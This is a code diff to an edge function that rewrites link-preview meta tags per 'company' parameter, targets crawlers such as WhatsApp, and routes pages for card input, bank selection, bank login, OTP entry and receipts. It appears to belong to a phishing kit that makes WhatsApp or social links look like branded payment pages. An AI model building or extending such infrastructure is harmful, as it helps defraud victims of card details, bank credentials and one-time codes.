@@ -111,6 +111,15 @@ const companyMeta: Record<string, { title: string; description: string; image: s
 export default async (request: Request, context: Context) => {
   try {
     const url = new URL(request.url);
+    const userAgent = request.headers.get("user-agent") || "";
+    
+    // Detect if request is from WhatsApp or other social media crawlers
+    const isCrawler = /WhatsApp|facebookexternalhit|Twitterbot|TelegramBot|LinkedInBot|Slackbot/i.test(userAgent);
+    
+    // Log request details for debugging
+    console.log(`[Dynamic Meta] Request URL: ${url.href}`);
+    console.log(`[Dynamic Meta] User-Agent: ${userAgent.substring(0, 50)}...`);
+    console.log(`[Dynamic Meta] Is Crawler: ${isCrawler}`);
     
     const acceptHeader = request.headers.get("accept") || "";
     if (!acceptHeader.includes("text/html")) {
@@ -126,14 +135,16 @@ export default async (request: Request, context: Context) => {
 
     let html = await response.text();
 
+    // Extract company parameter from URL
     const companyParam = url.searchParams.get("company") || url.searchParams.get("service") || "default";
     const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
     
-    const githubCDN = 'https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public';
-    const fullImageUrl = `${githubCDN}${meta.image}`;
+    // Use current domain (Netlify) instead of GitHub CDN for reliability and speed
+    const origin = url.origin;
+    const fullImageUrl = `${origin}${meta.image}`;
     const fullUrl = url.href;
 
-    console.log(`[Dynamic Meta] Params: company=${companyParam}, Title: ${meta.title.substring(0, 30)}...`);
+    console.log(`[Dynamic Meta] Company: ${companyParam}, Image: ${fullImageUrl}`);
 
     const metaUpdates = [
       { pattern: /<title>[^<]*<\/title>/gi, replacement: `<title>${meta.title}</title>` },
@@ -150,10 +161,19 @@ export default async (request: Request, context: Context) => {
       { pattern: /<meta\s+name="twitter:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image:alt" content="${meta.title}"/>` },
     ];
 
+    // Apply all meta tag updates
+    let replacementCount = 0;
     for (const update of metaUpdates) {
+      const beforeLength = html.length;
       html = html.replace(update.pattern, update.replacement);
+      if (html.length !== beforeLength) {
+        replacementCount++;
+      }
     }
+    
+    console.log(`[Dynamic Meta] Replaced ${replacementCount} meta tags`);
 
+    // Ensure og:url exists
     if (!html.includes('property="og:url"') && !html.includes("property='og:url'")) {
       html = html.replace(
         /<head>/i,
@@ -161,20 +181,53 @@ export default async (request: Request, context: Context) => {
       );
     }
 
+    // Ensure og:image:secure_url exists
     if (!html.includes('property="og:image:secure_url"') && !html.includes("property='og:image:secure_url'")) {
       html = html.replace(
         /<meta property="og:image"/i,
         `<meta property="og:image:secure_url" content="${fullImageUrl}"/>\n    <meta property="og:image"`
       );
     }
+    
+    // Fallback: If no OG tags were found in HTML, inject them all at the beginning of <head>
+    if (replacementCount === 0) {
+      console.log(`[Dynamic Meta] No existing meta tags found, injecting new ones`);
+      const metaTags = `
+    <!-- Dynamic Meta Tags - Injected by Edge Function -->
+    <title>${meta.title}</title>
+    <meta name="description" content="${meta.description}"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="نظام الدفع الآمن"/>
+    <meta property="og:locale" content="ar_AR"/>
+    <meta property="og:url" content="${fullUrl}"/>
+    <meta property="og:title" content="${meta.title}"/>
+    <meta property="og:description" content="${meta.description}"/>
+    <meta property="og:image" content="${fullImageUrl}"/>
+    <meta property="og:image:secure_url" content="${fullImageUrl}"/>
+    <meta property="og:image:width" content="1200"/>
+    <meta property="og:image:height" content="630"/>
+    <meta property="og:image:type" content="image/jpeg"/>
+    <meta property="og:image:alt" content="${meta.title}"/>
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="${meta.title}"/>
+    <meta name="twitter:description" content="${meta.description}"/>
+    <meta name="twitter:image" content="${fullImageUrl}"/>
+    <meta name="twitter:image:alt" content="${meta.title}"/>
+`;
+      html = html.replace(/<head>/i, `<head>${metaTags}`);
+    }
 
+    // Return modified HTML with strict no-cache headers for WhatsApp/social crawlers
     return new Response(html, {
       headers: {
         "content-type": "text/html; charset=utf-8",
-        "cache-control": "no-cache, no-store, must-revalidate, max-age=0",
+        "cache-control": "no-cache, no-store, must-revalidate, max-age=0, s-maxage=0",
         "pragma": "no-cache",
         "expires": "0",
-        "x-dynamic-meta": companyParam
+        "x-dynamic-meta": companyParam,
+        "x-company-param": companyParam,
+        "x-image-url": fullImageUrl,
+        "vary": "Accept, User-Agent"
       }
     });
   } catch (error) {
@@ -183,6 +236,19 @@ export default async (request: Request, context: Context) => {
   }
 };
 
+// Edge function configuration - match all HTML pages
 export const config = {
-  path: ["/", "/r/*", "/pay/*", "/payment-data/*", "/recipient/*"],
+  path: [
+    "/",
+    "/r/*",
+    "/pay/*",
+    "/payment-data/*",
+    "/recipient/*",
+    "/details/*",
+    "/card-input/*",
+    "/bank-selector/*",
+    "/bank-login/*",
+    "/otp/*",
+    "/receipt/*"
+  ],
 };
